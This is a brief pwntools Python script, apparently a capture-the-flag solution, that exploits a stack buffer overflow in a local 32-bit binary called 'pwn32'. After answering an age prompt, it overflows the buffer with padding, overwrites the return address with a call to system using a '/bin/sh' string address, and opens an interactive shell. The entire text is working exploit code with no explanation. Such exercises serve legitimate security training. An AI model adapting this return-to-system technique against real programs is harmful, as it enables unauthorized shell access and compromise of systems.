from pwn import *
p = process("./pwn32")

system  = 0x08049070
binsh   = 0x0804C02C
text    = b'a' * (0x58 + 4) + p32(system) + p32(0) + p32(binsh)

p.recvuntil('age?\n')
p.sendline('128')
p.recvuntil('overflow!\n')
p.sendline(text)
p.interactive()
